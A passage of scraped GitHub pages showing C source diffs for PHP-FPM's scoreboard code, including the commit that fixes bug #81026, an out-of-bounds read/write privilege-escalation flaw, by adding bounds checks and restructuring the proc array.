|  | + proc\_p = fpm\_scoreboard\_proc\_acquire\_from\_child(child, 1); |
|  | if (!proc\_p) { |
|  | zlog(ZLOG\_WARNING, "failed to acquire scoreboard"); |
|  | return; |
|  | @@ -287,7 +287,7 @@ int fpm\_request\_is\_idle(struct fpm\_child\_s \*child) /\* {{{ \*/ |
|  | struct fpm\_scoreboard\_proc\_s \*proc; |
|  |  |
|  | /\* no need in atomicity here \*/ |
|  | - proc = fpm\_scoreboard\_proc\_get(child->wp->scoreboard, child->scoreboard\_i); |
|  | + proc = fpm\_scoreboard\_proc\_get\_from\_child(child); |
|  | if (!proc) { |
|  | return 0; |
|  | } |
|  | @@ -302,7 +302,7 @@ int fpm\_request\_last\_activity(struct fpm\_child\_s \*child, struct timeval \*tv) /\* |
|  |  |
|  | if (!tv) return -1; |
|  |  |
|  | - proc = fpm\_scoreboard\_proc\_get(child->wp->scoreboard, child->scoreboard\_i); |
|  | + proc = fpm\_scoreboard\_proc\_get\_from\_child(child); |
|  | if (!proc) { |
|  | return -1; |
|  | } |
|  | diff --git a/sapi/fpm/fpm/fpm\_scoreboard.c b/sapi/fpm/fpm/fpm\_scoreboard.c |
|  | index 328f999f0c..aa0aa9861b 100644 |
|  | --- a/sapi/fpm/fpm/fpm\_scoreboard.c |
|  | +++ b/sapi/fpm/fpm/fpm\_scoreboard.c |
|  | @@ -6,6 +6,7 @@ |
|  | #include <time.h> |
|  |  |
|  | #include "fpm\_config.h" |
|  | +#include "fpm\_children.h" |
|  | #include "fpm\_scoreboard.h" |
|  | #include "fpm\_shm.h" |
|  | #include "fpm\_sockets.h" |
|  | @@ -184,6 +185,24 @@ struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get(struct fpm\_scoreboard\_s \*s |
|  | } |
|  | /\* }}} \*/ |
|  |  |
|  | +struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get\_from\_child(struct fpm\_child\_s \*child) /\* {{{\*/ |
|  | +{ |
|  | + struct fpm\_worker\_pool\_s \*wp = child->wp; |
|  | + struct fpm\_scoreboard\_proc\_s \*proc = fpm\_scoreboard\_proc\_get(wp->scoreboard, child->scoreboard\_i); |
|  | + size\_t proc\_ptr\_array\_size = (wp->config->pm\_max\_children) \* sizeof(struct fpm\_scoreboard\_proc\_s \*); |
|  | + ptrdiff\_t proc\_start = (uintptr\_t) wp->scoreboard + sizeof(struct fpm\_scoreboard\_s) + proc\_ptr\_array\_size; |
|  | + ptrdiff\_t proc\_end = proc\_start + (wp->config->pm\_max\_children - 1) \* sizeof(struct fpm\_scoreboard\_proc\_s \*); |
|  | + uintptr\_t proc\_position = (uintptr\_t) proc; |
|  | + |
|  | + if (proc\_position < proc\_start || proc\_position > proc\_end) { |
|  | + zlog(ZLOG\_WARNING, "failed to get proc from the child scoreboard because the proc pointer is invalid"); |
|  | + return NULL; |
|  | + } |
|  | + |
|  | + return proc; |
|  | +} |
|  | +/\* }}} \*/ |
|  | + |
|  | struct fpm\_scoreboard\_s \*fpm\_scoreboard\_acquire(struct fpm\_scoreboard\_s \*scoreboard, int nohang) /\* {{{ \*/ |
|  | { |
|  | struct fpm\_scoreboard\_s \*s; |
|  | @@ -225,6 +244,23 @@ struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_acquire(struct fpm\_scoreboard\_ |
|  | } |
|  | /\* }}} \*/ |
|  |  |
|  | +struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_acquire\_from\_child(struct fpm\_child\_s \*child, int nohang) /\* {{{ \*/ |
|  | +{ |
|  | + struct fpm\_scoreboard\_proc\_s \*proc; |
|  | + |
|  | + proc = fpm\_scoreboard\_proc\_get\_from\_child(child); |
|  | + if (!proc) { |
|  | + return NULL; |
|  | + } |
|  | + |
|  | + if (!fpm\_spinlock(&proc->lock, nohang)) { |
|  | + return NULL; |
|  | + } |
|  | + |
|  | + return proc; |
|  | +} |
|  | +/\* }}} \*/ |
|  | + |
|  | void fpm\_scoreboard\_proc\_release(struct fpm\_scoreboard\_proc\_s \*proc) /\* {{{ \*/ |
|  | { |
|  | if (!proc) { |
|  | diff --git a/sapi/fpm/fpm/fpm\_scoreboard.h b/sapi/fpm/fpm/fpm\_scoreboard.h |
|  | index 1fecde1d0f..ff7ed1806d 100644 |
|  | --- a/sapi/fpm/fpm/fpm\_scoreboard.h |
|  | +++ b/sapi/fpm/fpm/fpm\_scoreboard.h |
|  | @@ -72,10 +72,12 @@ int fpm\_scoreboard\_init\_child(struct fpm\_worker\_pool\_s \*wp); |
|  | void fpm\_scoreboard\_update(int idle, int active, int lq, int lq\_len, int requests, int max\_children\_reached, int slow\_rq, int action, struct fpm\_scoreboard\_s \*scoreboard); |
|  | struct fpm\_scoreboard\_s \*fpm\_scoreboard\_get(); |
|  | struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get(struct fpm\_scoreboard\_s \*scoreboard, int child\_index); |
|  | +struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get\_from\_child(struct fpm\_child\_s \*child); |
|  |  |
|  | struct fpm\_scoreboard\_s \*fpm\_scoreboard\_acquire(struct fpm\_scoreboard\_s \*scoreboard, int nohang); |
|  | void fpm\_scoreboard\_release(struct fpm\_scoreboard\_s \*scoreboard); |
|  | struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_acquire(struct fpm\_scoreboard\_s \*scoreboard, int child\_index, int nohang); |
|  | +struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_acquire\_from\_child(struct fpm\_child\_s \*child, int nohang); |
|  | void fpm\_scoreboard\_proc\_release(struct fpm\_scoreboard\_proc\_s \*proc); |
|  |  |
|  | void fpm\_scoreboard\_free(struct fpm\_scoreboard\_s \*scoreboard); |
|  | -- |
|  | 2.25.1 |
|  |  |

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fbukka%2F72a0408e027b85e72d6f4e622974eb01)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_d21cc1a1_20250115_115346.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2Ffadb1f8c1d08ae62b4f0a16917040fde57a3b93b)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2Ffadb1f8c1d08ae62b4f0a16917040fde57a3b93b)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=php%2Fphp-src)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[php](/php)
/
**[php-src](/php/php-src)**
Public

* [Notifications](/login?return_to=%2Fphp%2Fphp-src) You must be signed in to change notification settings
* [Fork
  7.8k](/login?return_to=%2Fphp%2Fphp-src)
* [Star
   38.5k](/login?return_to=%2Fphp%2Fphp-src)

* [Code](/php/php-src)
* [Issues
  737](/php/php-src/issues)
* [Pull requests
  563](/php/php-src/pulls)
* [Actions](/php/php-src/actions)
* [Security](/php/php-src/security)
* [Insights](/php/php-src/pulse)

Additional navigation options

* [Code](/php/php-src)
* [Issues](/php/php-src/issues)
* [Pull requests](/php/php-src/pulls)
* [Actions](/php/php-src/actions)
* [Security](/php/php-src/security)
* [Insights](/php/php-src/pulse)

## Commit

[Permalink](/php/php-src/commit/fadb1f8c1d08ae62b4f0a16917040fde57a3b93b)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix bug #81026 (PHP-FPM oob R/W in root process leading to priv escal…

[Browse files](/php/php-src/tree/fadb1f8c1d08ae62b4f0a16917040fde57a3b93b)
Browse the repository at this point in the history

```
…ation)

The main change is to store scoreboard procs directly to the variable sized
array rather than indirectly through the pointer.

Signed-off-by: Stanislav Malyshev <stas@php.net>
```

* Loading branch information

[![@bukka](https://avatars.githubusercontent.com/u/137594?s=40&v=4)](/bukka) [![@smalyshev](https://avatars.githubusercontent.com/u/155000?s=40&v=4)](/smalyshev)

[bukka](/php/php-src/commits?author=bukka "View all commits by bukka")
authored and
[smalyshev](/php/php-src/commits?author=smalyshev "View all commits by smalyshev")
committed
Oct 18, 2021

1 parent
[6bd5271](/php/php-src/commit/6bd5271c62e117778d4f20b039b4838515527d62)

commit fadb1f8

 Show file tree

 Hide file tree

Showing
**6 changed files**
with
**81 additions**
and
**60 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* sapi/fpm/fpm

  + sapi/fpm/fpm/fpm\_children.c
    [fpm\_children.c](#diff-bc9e3a640014947c1b61c24965278aed577c94f2bdb7239ab7ac360ab8c4ce36)
  + sapi/fpm/fpm/fpm\_request.c
    [fpm\_request.c](#diff-7ca8f731ee921683e85b271ab731ae02f4cdc05b2cec6630ffa423b398c3e770)
  + sapi/fpm/fpm/fpm\_scoreboard.c
    [fpm\_scoreboard.c](#diff-5c4b3234616dbadda2d47a6c9dc035b7f96873bd2b324e61ace2713ae6ddace2)
  + sapi/fpm/fpm/fpm\_scoreboard.h
    [fpm\_scoreboard.h](#diff-6973e7a71e7238efe84f48f3db2c0f9d2d602b9822e89fab5a835ac3d34acf23)
  + sapi/fpm/fpm/fpm\_status.c
    [fpm\_status.c](#diff-838af21e79da4e7bd0e5c8a70aff09feda8066550d75c8fb1a6e9db674e431b5)
  + sapi/fpm/fpm/fpm\_worker\_pool.c
    [fpm\_worker\_pool.c](#diff-3ed2a6a89d2e60c82de36155bb1e27aba222471c5721a0c0c4322b88ee08ac42)

## There are no files selected for viewing

14 changes: 7 additions & 7 deletions

14
[sapi/fpm/fpm/fpm\_children.c](#diff-bc9e3a640014947c1b61c24965278aed577c94f2bdb7239ab7ac360ab8c4ce36 "sapi/fpm/fpm/fpm_children.c")

Show comments

[View file](/php/php-src/blob/fadb1f8c1d08ae62b4f0a16917040fde57a3b93b/sapi/fpm/fpm/fpm_children.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -246,7 +246,7 @@ void fpm\_children\_bury() /\* {{{ \*/ |
|  |  |  |
|  |  | fpm\_child\_unlink(child); |
|  |  |  |
|  |  | fpm\_scoreboard\_proc\_free(wp->scoreboard, child->scoreboard\_i); |
|  |  | fpm\_scoreboard\_proc\_free(child); |
|  |  |  |
|  |  | fpm\_clock\_get(&tv1); |
|  |  |  |
| Expand All | | @@ -256,9 +256,9 @@ void fpm\_children\_bury() /\* {{{ \*/ |
|  |  | if (!fpm\_pctl\_can\_spawn\_children()) { |
|  |  | severity = ZLOG\_DEBUG; |
|  |  | } |
|  |  | zlog(severity, "[pool %s] child %d exited %s after %ld.%06d seconds from start", child->wp->config->name, (int) pid, buf, tv2.tv\_sec, (int) tv2.tv\_usec); |
|  |  | zlog(severity, "[pool %s] child %d exited %s after %ld.%06d seconds from start", wp->config->name, (int) pid, buf, tv2.tv\_sec, (int) tv2.tv\_usec); |
|  |  | } else { |
|  |  | zlog(ZLOG\_DEBUG, "[pool %s] child %d has been killed by the process management after %ld.%06d seconds from start", child->wp->config->name, (int) pid, tv2.tv\_sec, (int) tv2.tv\_usec); |
|  |  | zlog(ZLOG\_DEBUG, "[pool %s] child %d has been killed by the process management after %ld.%06d seconds from start", wp->config->name, (int) pid, tv2.tv\_sec, (int) tv2.tv\_usec); |
|  |  | } |
|  |  |  |
|  |  | fpm\_child\_close(child, 1 /\* in event\_loop \*/); |
| Expand Down  Expand Up | | @@ -324,7 +324,7 @@ static struct fpm\_child\_s \*fpm\_resources\_prepare(struct fpm\_worker\_pool\_s \*wp) / |
|  |  | return 0; |
|  |  | } |
|  |  |  |
|  |  | if (0 > fpm\_scoreboard\_proc\_alloc(wp->scoreboard, &c->scoreboard\_i)) { |
|  |  | if (0 > fpm\_scoreboard\_proc\_alloc(c)) { |
|  |  | fpm\_stdio\_discard\_pipes(c); |
|  |  | fpm\_child\_free(c); |
|  |  | return 0; |
| Expand All | | @@ -336,7 +336,7 @@ static struct fpm\_child\_s \*fpm\_resources\_prepare(struct fpm\_worker\_pool\_s \*wp) / |
|  |  |  |
|  |  | static void fpm\_resources\_discard(struct fpm\_child\_s \*child) /\* {{{ \*/ |
|  |  | { |
|  |  | fpm\_scoreboard\_proc\_free(child->wp->scoreboard, child->scoreboard\_i); |
|  |  | fpm\_scoreboard\_proc\_free(child); |
|  |  | fpm\_stdio\_discard\_pipes(child); |
|  |  | fpm\_child\_free(child); |
|  |  | } |
| Expand All | | @@ -349,10 +349,10 @@ static void fpm\_child\_resources\_use(struct fpm\_child\_s \*child) /\* {{{ \*/ |
|  |  | if (wp == child->wp || wp == child->wp->shared) { |
|  |  | continue; |
|  |  | } |
|  |  | fpm\_scoreboard\_free(wp->scoreboard); |
|  |  | fpm\_scoreboard\_free(wp); |
|  |  | } |
|  |  |  |
|  |  | fpm\_scoreboard\_child\_use(child->wp->scoreboard, child->scoreboard\_i, getpid()); |
|  |  | fpm\_scoreboard\_child\_use(child, getpid()); |
|  |  | fpm\_stdio\_child\_use\_pipes(child); |
|  |  | fpm\_child\_free(child); |
|  |  | } |
| Expand Down | |  |

4 changes: 2 additions & 2 deletions

4
[sapi/fpm/fpm/fpm\_request.c](#diff-7ca8f731ee921683e85b271ab731ae02f4cdc05b2cec6630ffa423b398c3e770 "sapi/fpm/fpm/fpm_request.c")

Show comments

[View file](/php/php-src/blob/fadb1f8c1d08ae62b4f0a16917040fde57a3b93b/sapi/fpm/fpm/fpm_request.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -285,7 +285,7 @@ int fpm\_request\_is\_idle(struct fpm\_child\_s \*child) /\* {{{ \*/ |
|  |  | struct fpm\_scoreboard\_proc\_s \*proc; |
|  |  |  |
|  |  | /\* no need in atomicity here \*/ |
|  |  | proc = fpm\_scoreboard\_proc\_get(child->wp->scoreboard, child->scoreboard\_i); |
|  |  | proc = fpm\_scoreboard\_proc\_get\_from\_child(child); |
|  |  | if (!proc) { |
|  |  | return 0; |
|  |  | } |
| Expand All | | @@ -300,7 +300,7 @@ int fpm\_request\_last\_activity(struct fpm\_child\_s \*child, struct timeval \*tv) /\* |
|  |  |  |
|  |  | if (!tv) return -1; |
|  |  |  |
|  |  | proc = fpm\_scoreboard\_proc\_get(child->wp->scoreboard, child->scoreboard\_i); |
|  |  | proc = fpm\_scoreboard\_proc\_get\_from\_child(child); |
|  |  | if (!proc) { |
|  |  | return -1; |
|  |  | } |
| Expand Down | |  |

106 changes: 63 additions & 43 deletions

106
[sapi/fpm/fpm/fpm\_scoreboard.c](#diff-5c4b3234616dbadda2d47a6c9dc035b7f96873bd2b324e61ace2713ae6ddace2 "sapi/fpm/fpm/fpm_scoreboard.c")

Show comments

[View file](/php/php-src/blob/fadb1f8c1d08ae62b4f0a16917040fde57a3b93b/sapi/fpm/fpm/fpm_scoreboard.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -6,6 +6,7 @@ |
|  |  | #include <time.h> |
|  |  |  |
|  |  | #include "fpm\_config.h" |
|  |  | #include "fpm\_children.h" |
|  |  | #include "fpm\_scoreboard.h" |
|  |  | #include "fpm\_shm.h" |
|  |  | #include "fpm\_sockets.h" |
| Expand All | | @@ -23,7 +24,6 @@ static float fpm\_scoreboard\_tick; |
|  |  | int fpm\_scoreboard\_init\_main() /\* {{{ \*/ |
|  |  | { |
|  |  | struct fpm\_worker\_pool\_s \*wp; |
|  |  | unsigned int i; |
|  |  |  |
|  |  | #ifdef HAVE\_TIMES |
|  |  | #if (defined(HAVE\_SYSCONF) && defined(\_SC\_CLK\_TCK)) |
| Expand All | | @@ -40,7 +40,7 @@ int fpm\_scoreboard\_init\_main() /\* {{{ \*/ |
|  |  |  |
|  |  |  |
|  |  | for (wp = fpm\_worker\_all\_pools; wp; wp = wp->next) { |
|  |  | size\_t scoreboard\_size, scoreboard\_nprocs\_size; |
|  |  | size\_t scoreboard\_procs\_size; |
|  |  | void \*shm\_mem; |
|  |  |  |
|  |  | if (wp->config->pm\_max\_children < 1) { |
| Expand All | | @@ -53,22 +53,15 @@ int fpm\_scoreboard\_init\_main() /\* {{{ \*/ |
|  |  | return -1; |
|  |  | } |
|  |  |  |
|  |  | scoreboard\_size = sizeof(struct fpm\_scoreboard\_s) + (wp->config->pm\_max\_children) \* sizeof(struct fpm\_scoreboard\_proc\_s \*); |
|  |  | scoreboard\_nprocs\_size = sizeof(struct fpm\_scoreboard\_proc\_s) \* wp->config->pm\_max\_children; |
|  |  | shm\_mem = fpm\_shm\_alloc(scoreboard\_size + scoreboard\_nprocs\_size); |
|  |  | scoreboard\_procs\_size = sizeof(struct fpm\_scoreboard\_proc\_s) \* wp->config->pm\_max\_children; |
|  |  | shm\_mem = fpm\_shm\_alloc(sizeof(struct fpm\_scoreboard\_s) + scoreboard\_procs\_size); |
|  |  |  |
|  |  | if (!shm\_mem) { |
|  |  | return -1; |
|  |  | } |
|  |  | wp->scoreboard = shm\_mem; |
|  |  | wp->scoreboard = shm\_mem; |
|  |  | wp->scoreboard->pm = wp->config->pm; |
|  |  | wp->scoreboard->nprocs = wp->config->pm\_max\_children; |
|  |  | shm\_mem += scoreboard\_size; |
|  |  |  |
|  |  | for (i = 0; i < wp->scoreboard->nprocs; i++, shm\_mem += sizeof(struct fpm\_scoreboard\_proc\_s)) { |
|  |  | wp->scoreboard->procs[i] = shm\_mem; |
|  |  | } |
|  |  |  |
|  |  | wp->scoreboard->pm = wp->config->pm; |
|  |  | wp->scoreboard->start\_epoch = time(NULL); |
|  |  | strlcpy(wp->scoreboard->pool, wp->config->name, sizeof(wp->scoreboard->pool)); |
|  |  |  |
| Expand Down  Expand Up | | @@ -167,28 +160,48 @@ struct fpm\_scoreboard\_s \*fpm\_scoreboard\_get() /\* {{{\*/ |
|  |  | } |
|  |  | /\* }}} \*/ |
|  |  |  |
|  |  | struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get(struct fpm\_scoreboard\_s \*scoreboard, int child\_index) /\* {{{\*/ |
|  |  | static inline struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get\_ex( |
|  |  | struct fpm\_scoreboard\_s \*scoreboard, int child\_index, unsigned int nprocs) /\* {{{\*/ |
|  |  | { |
|  |  | if (!scoreboard) { |
|  |  | scoreboard = fpm\_scoreboard; |
|  |  | return NULL; |
|  |  | } |
|  |  |  |
|  |  | if (!scoreboard) { |
|  |  | if (child\_index < 0 || (unsigned int)child\_index >= nprocs) { |
|  |  | return NULL; |
|  |  | } |
|  |  |  |
|  |  | return &scoreboard->procs[child\_index]; |
|  |  | } |
|  |  | /\* }}} \*/ |
|  |  |  |
|  |  | struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get( |
|  |  | struct fpm\_scoreboard\_s \*scoreboard, int child\_index) /\* {{{\*/ |
|  |  | { |
|  |  | if (!scoreboard) { |
|  |  | scoreboard = fpm\_scoreboard; |
|  |  | } |
|  |  |  |
|  |  | if (child\_index < 0) { |
|  |  | child\_index = fpm\_scoreboard\_i; |
|  |  | } |
|  |  |  |
|  |  | if (child\_index < 0 || (unsigned int)child\_index >= scoreboard->nprocs) { |
|  |  | return NULL; |
|  |  | } |
|  |  | return fpm\_scoreboard\_proc\_get\_ex(scoreboard, child\_index, scoreboard->nprocs); |
|  |  | } |
|  |  | /\* }}} \*/ |
|  |  |  |
|  |  | return scoreboard->procs[child\_index]; |
|  |  | struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get\_from\_child(struct fpm\_child\_s \*child) /\* {{{\*/ |
|  |  | { |
|  |  | struct fpm\_worker\_pool\_s \*wp = child->wp; |
|  |  | unsigned int nprocs = wp->config->pm\_max\_children; |
|  |  | struct fpm\_scoreboard\_s \*scoreboard = wp->scoreboard; |
|  |  | int child\_index = child->scoreboard\_i; |
|  |  |  |
|  |  | return fpm\_scoreboard\_proc\_get\_ex(scoreboard, child\_index, nprocs); |
|  |  | } |
|  |  | /\* }}} \*/ |
|  |  |  |
|  |  |  |
|  |  | struct fpm\_scoreboard\_s \*fpm\_scoreboard\_acquire(struct fpm\_scoreboard\_s \*scoreboard, int nohang) /\* {{{ \*/ |
|  |  | { |
|  |  | struct fpm\_scoreboard\_s \*s; |
| Expand Down  Expand Up | | @@ -239,28 +252,28 @@ void fpm\_scoreboard\_proc\_release(struct fpm\_scoreboard\_proc\_s \*proc) /\* {{{ \*/ |
|  |  | proc->lock = 0; |
|  |  | } |
|  |  |  |
|  |  | void fpm\_scoreboard\_free(struct fpm\_scoreboard\_s \*scoreboard) /\* {{{ \*/ |
|  |  | void fpm\_scoreboard\_free(struct fpm\_worker\_pool\_s \*wp) /\* {{{ \*/ |
|  |  | { |
|  |  | size\_t scoreboard\_size, scoreboard\_nprocs\_size; |
|  |  | size\_t scoreboard\_procs\_size; |
|  |  | struct fpm\_scoreboard\_s \*scoreboard = wp->scoreboard; |
|  |  |  |
|  |  | if (!scoreboard) { |
|  |  | zlog(ZLOG\_ERROR, "\*\*scoreboard is NULL"); |
|  |  | return; |
|  |  | } |
|  |  |  |
|  |  | scoreboard\_size = sizeof(struct fpm\_scoreboard\_s) + (scoreboard->nprocs) \* sizeof(struct fpm\_scoreboard\_proc\_s \*); |
|  |  | scoreboard\_nprocs\_size = sizeof(struct fpm\_scoreboard\_proc\_s) \* scoreboard->nprocs; |
|  |  | scoreboard\_procs\_size = sizeof(struct fpm\_scoreboard\_proc\_s) \* wp->config->pm\_max\_children; |
|  |  |  |
|  |  | fpm\_shm\_free(scoreboard, scoreboard\_size + scoreboard\_nprocs\_size); |
|  |  | fpm\_shm\_free(scoreboard, sizeof(struct fpm\_scoreboard\_s) + scoreboard\_procs\_size); |
|  |  | } |
|  |  | /\* }}} \*/ |
|  |  |  |
|  |  | void fpm\_scoreboard\_child\_use(struct fpm\_scoreboard\_s \*scoreboard, int child\_index, pid\_t pid) /\* {{{ \*/ |
|  |  | void fpm\_scoreboard\_child\_use(struct fpm\_child\_s \*child, pid\_t pid) /\* {{{ \*/ |
|  |  | { |
|  |  | struct fpm\_scoreboard\_proc\_s \*proc; |
|  |  | fpm\_scoreboard = scoreboard; |
|  |  | fpm\_scoreboard\_i = child\_index; |
|  |  | proc = fpm\_scoreboard\_proc\_get(scoreboard, child\_index); |
|  |  | fpm\_scoreboard = child->wp->scoreboard; |
|  |  | fpm\_scoreboard\_i = child->scoreboard\_i; |
|  |  | proc = fpm\_scoreboard\_proc\_get\_from\_child(child); |
|  |  | if (!proc) { |
|  |  | return; |
|  |  | } |
| Expand All | | @@ -269,60 +282,67 @@ void fpm\_scoreboard\_child\_use(struct fpm\_scoreboard\_s \*scoreboard, int child\_ind |
|  |  | } |
|  |  | /\* }}} \*/ |
|  |  |  |
|  |  | void fpm\_scoreboard\_proc\_free(struct fpm\_scoreboard\_s \*scoreboard, int child\_index) /\* {{{ \*/ |
|  |  | void fpm\_scoreboard\_proc\_free(struct fpm\_child\_s \*child) /\* {{{ \*/ |
|  |  | { |
|  |  | struct fpm\_worker\_pool\_s \*wp = child->wp; |
|  |  | struct fpm\_scoreboard\_s \*scoreboard = wp->scoreboard; |
|  |  | int child\_index = child->scoreboard\_i; |
|  |  |  |
|  |  | if (!scoreboard) { |
|  |  | return; |
|  |  | } |
|  |  |  |
|  |  | if (child\_index < 0 || (unsigned int)child\_index >= scoreboard->nprocs) { |
|  |  | if (child\_index < 0 || child\_index >= wp->config->pm\_max\_children) { |
|  |  | return; |
|  |  | } |
|  |  |  |
|  |  | if (scoreboard->procs[child\_index] && scoreboard->procs[child\_index]->used > 0) { |
|  |  | memset(scoreboard->procs[child\_index], 0, sizeof(struct fpm\_scoreboard\_proc\_s)); |
|  |  | if (scoreboard->procs[child\_index].used > 0) { |
|  |  | memset(&scoreboard->procs[child\_index], 0, sizeof(struct fpm\_scoreboard\_proc\_s)); |
|  |  | } |
|  |  |  |
|  |  | /\* set this slot as free to avoid search on next alloc \*/ |
|  |  | scoreboard->free\_proc = child\_index; |
|  |  | } |
|  |  | /\* }}} \*/ |
|  |  |  |
|  |  | int fpm\_scoreboard\_proc\_alloc(struct fpm\_scoreboard\_s \*scoreboard, int \*child\_index) /\* {{{ \*/ |
|  |  | int fpm\_scoreboard\_proc\_alloc(struct fpm\_child\_s \*child) /\* {{{ \*/ |
|  |  | { |
|  |  | int i = -1; |
|  |  | struct fpm\_worker\_pool\_s \*wp = child->wp; |
|  |  | struct fpm\_scoreboard\_s \*scoreboard = wp->scoreboard; |
|  |  | int nprocs = wp->config->pm\_max\_children; |
|  |  |  |
|  |  | if (!scoreboard || !child\_index) { |
|  |  | if (!scoreboard) { |
|  |  | return -1; |
|  |  | } |
|  |  |  |
|  |  | /\* first try the slot which is supposed to be free \*/ |
|  |  | if (scoreboard->free\_proc >= 0 && (unsigned int)scoreboard->free\_proc < scoreboard->nprocs) { |
|  |  | if (scoreboard->procs[scoreboard->free\_proc] && !scoreboard->procs[scoreboard->free\_proc]->used) { |
|  |  | if (scoreboard->free\_proc >= 0 && scoreboard->free\_proc < nprocs) { |
|  |  | if (!scoreboard->procs[scoreboard->free\_proc].used) { |
|  |  | i = scoreboard->free\_proc; |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | if (i < 0) { /\* the supposed free slot is not, let's search for a free slot \*/ |
|  |  | zlog(ZLOG\_DEBUG, "[pool %s] the proc->free\_slot was not free. Let's search", scoreboard->pool); |
|  |  | for (i = 0; i < (int)scoreboard->nprocs; i++) { |
